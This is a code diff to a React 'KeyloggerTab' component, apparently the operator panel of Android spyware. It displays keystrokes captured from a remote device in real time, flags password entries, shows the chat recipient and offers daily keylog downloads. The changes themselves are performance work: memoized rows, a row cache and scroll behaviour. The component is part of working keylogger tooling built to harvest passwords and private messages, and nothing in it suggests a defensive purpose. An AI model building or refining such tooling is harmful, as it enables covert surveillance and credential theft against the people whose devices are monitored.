@@ -23,17 +23,6 @@ function getAppShortName(pkg) {
   return parts[parts.length - 1]?.slice(0, 2).toUpperCase() || '??';
 }
 
-function dedupeByTimestampAndText(entries) {
-  const seen = new Set();
-  return entries.filter(e => {
-    const text = e.text ?? e.content ?? e.typedText ?? '';
-    const key = `${e.packageName || e.package || ''}|${e.timestamp || e.postTime || e.time || ''}|${text}`;
-    if (seen.has(key)) return false;
-    seen.add(key);
-    return true;
-  });
-}
-
 /**
  * Per-day keylog files are JSONL — one entry object per line. Falls back to raw
  * text lines when a line is not valid JSON so a partially written file still
@@ -60,6 +49,37 @@ function decodeBase64(b64) {
   return new TextDecoder('utf-8').decode(bytes);
 }
 
+/**
+ * One feed row, memoized on the entry object itself. The parent rebuilds the
+ * row objects on every push, but keeps the *reference* of untouched rows, so
+ * React skips re-rendering them instead of repainting the whole feed.
+ */
+const KeylogRow = React.memo(function KeylogRow({ entry }) {
+  const pkg = entry.packageName || '';
+  const color = getAppColor(pkg);
+  return (
+    <div className="kl-entry">
+      <div
+        className="kl-app-badge"
+        style={{ background: color + '22', borderColor: color + '66', color }}
+      >
+        {getAppShortName(pkg)}
+      </div>
+      <div className="kl-entry-body">
+        <span className="kl-app-name">{(entry.appName || pkg || '').split('.').pop()}</span>
+        {entry.screenTitle && (
+          <span title="Recipient / chat context" style={{ fontSize: 11, background: '#3b82f622', color: '#60a5fa', border: '1px solid #3b82f666', borderRadius: 4, padding: '1px 6px', marginRight: 4, fontWeight: 600 }}>→ {entry.screenTitle}</span>
+        )}
+        {(entry.isPassword === true || entry.isPassword === 'true' || entry.eventType === 'PASSWORD_FOCUS') && (
+          <span title={entry.fieldType || 'password field'} style={{ fontSize: 11, background: '#ef444422', color: '#ef4444', border: '1px solid #ef444466', borderRadius: 4, padding: '1px 5px', marginRight: 4, fontWeight: 700, letterSpacing: 0.5 }}>🔑 PWD</span>
+        )}
+        <span className="kl-text">{entry.text ?? entry.content ?? entry.typedText ?? ''}</span>
+      </div>
+      <div className="kl-ts">{formatDateTime(entry.timestamp, '')}</div>
+    </div>
+  );
+});
+
 export default function KeyloggerTab({ device, sendCommand, results, keylogPushEntries }) {
   const deviceId  = device.deviceId;
   const isOnline  = device.isOnline;
@@ -70,7 +90,8 @@ export default function KeyloggerTab({ device, sendCommand, results, keylogPushE
   const [filterPkg, setFilterPkg]     = useState('');
   const [autoScroll, setAutoScroll]   = useState(true);
   const [viewMode, setViewMode]       = useState('live');
-  const logEndRef = useRef(null);
+  const feedRef = useRef(null);
+  const stickToTopRef = useRef(true);
   const seenResultIds = useRef(new Set());
 
   // Single-file viewer window. `date` is the file being shown; `raw` keeps the
@@ -174,10 +195,37 @@ export default function KeyloggerTab({ device, sendCommand, results, keylogPushE
   // Keylogs arrive via push events (keylog:push) from the Android app in real time.
   // File listing and keylog fetching are triggered manually via buttons.
 
-  const combinedLogs = useMemo(() => dedupeByTimestampAndText([
-    ...(keylogPushEntries || []),
-    ...storedLogs,
-  ]), [keylogPushEntries, storedLogs]);
+  // Rows are rebuilt whenever a push arrives, but every row whose content did
+  // not change is reused from this cache so its object identity — and therefore
+  // its <KeylogRow> memo — stays intact. Without this, each new keystroke would
+  // hand React a fresh object for the entire feed and repaint every row, which
+  // reads as the UI flashing on every update.
+  const rowCacheRef = useRef(new Map());
+
+  const combinedLogs = useMemo(() => {
+    const cache = rowCacheRef.current;
+    const seen = new Set();
+    const rows = [];
+    for (const src of [...(keylogPushEntries || []), ...storedLogs]) {
+      if (!src || typeof src !== 'object') continue;
+      const text = src.text ?? src.content ?? src.typedText ?? '';
+      const sig = `${src.packageName || src.package || ''}|${src.timestamp || src.postTime || src.time || ''}|${text}`;
+      if (seen.has(sig)) continue;
+      seen.add(sig);
+      let row = cache.get(sig);
+      if (!row || row.eventType !== (src.eventType || '') || row.screenTitle !== src.screenTitle) {
+        row = { ...src, text, _k: sig };
+        cache.set(sig, row);
+      }
+      rows.push(row);
+    }
+    // Keep the cache from growing without bound on long-running sessions.
+    if (cache.size > rows.length * 2 + 500) {
+      const keep = new Set(rows.slice(0, rows.length).map(r => r._k));
+      for (const k of cache.keys()) if (!keep.has(k)) cache.delete(k);
+    }
+    return rows;
+  }, [keylogPushEntries, storedLogs]);
 
   const filtered = useMemo(() => filterPkg
     ? combinedLogs.filter(l => (l.packageName || '').includes(filterPkg))
@@ -188,11 +236,21 @@ export default function KeyloggerTab({ device, sendCommand, results, keylogPushE
     [...new Set(combinedLogs.map(l => l.packageName).filter(Boolean))],
   [combinedLogs]);
 
+  // Entries arrive newest-first, so auto-scroll pins the container to the top.
+  // It only does so while the reader is already near the top, so scrolling back
+  // through history is not yanked away by incoming events.
+  const onFeedScroll = useCallback(() => {
+    const el = feedRef.current;
+    if (el) stickToTopRef.current = el.scrollTop <= 24;
+  }, []);
+
   useEffect(() => {
-    if (autoScroll && logEndRef.current) {
-      logEndRef.current.scrollIntoView({ behavior: 'auto' });
-    }
-  }, [combinedLogs.length, autoScroll]);
+    if (!autoScroll || !stickToTopRef.current) return;
+    const el = feedRef.current;
+    if (!el) return;
+    if (el.scrollTop === 0) return;
+    el.scrollTop = 0;
+  }, [filtered.length, autoScroll]);
 
   const downloadDay = (date) => {
     // Clearing the pending-view marker guarantees this response is saved to
@@ -292,7 +350,7 @@ export default function KeyloggerTab({ device, sendCommand, results, keylogPushE
               </span>
             </span>
           </div>
-          <div className="kl-feed">
+          <div className="kl-feed" ref={feedRef} onScroll={onFeedScroll}>
             {filtered.length === 0 && (
               <div className="kl-empty">
                 <div style={{ fontSize: 40 }}>⌨️</div>
@@ -302,28 +360,7 @@ export default function KeyloggerTab({ device, sendCommand, results, keylogPushE
                 </div>
               </div>
             )}
-            {filtered.map((entry, i) => (
-              <div key={`${entry.timestamp}-${entry.packageName}-${i}`} className="kl-entry">
-                <div
-                  className="kl-app-badge"
-                  style={{ background: getAppColor(entry.packageName) + '22', borderColor: getAppColor(entry.packageName) + '66', color: getAppColor(entry.packageName) }}
-                >
-                  {getAppShortName(entry.packageName)}
-                </div>
-                <div className="kl-entry-body">
-                  <span className="kl-app-name">{(entry.appName || entry.packageName || '').split('.').pop()}</span>
-                  {entry.screenTitle && (
-                    <span title="Recipient / chat context" style={{ fontSize: 11, background: '#3b82f622', color: '#60a5fa', border: '1px solid #3b82f666', borderRadius: 4, padding: '1px 6px', marginRight: 4, fontWeight: 600 }}>→ {entry.screenTitle}</span>
-                  )}
-                  {(entry.isPassword === true || entry.isPassword === 'true' || entry.eventType === 'PASSWORD_FOCUS') && (
-                    <span title={entry.fieldType || 'password field'} style={{ fontSize: 11, background: '#ef444422', color: '#ef4444', border: '1px solid #ef444466', borderRadius: 4, padding: '1px 5px', marginRight: 4, fontWeight: 700, letterSpacing: 0.5 }}>🔑 PWD</span>
-                  )}
-                   <span className="kl-text">{entry.text ?? entry.content ?? entry.typedText ?? ''}</span>
-                </div>
-                <div className="kl-ts">{formatDateTime(entry.timestamp, '')}</div>
-              </div>
-            ))}
-            <div ref={logEndRef} />
+            {filtered.map(entry => <KeylogRow key={entry._k} entry={entry} />)}
           </div>
         </div>
       )}
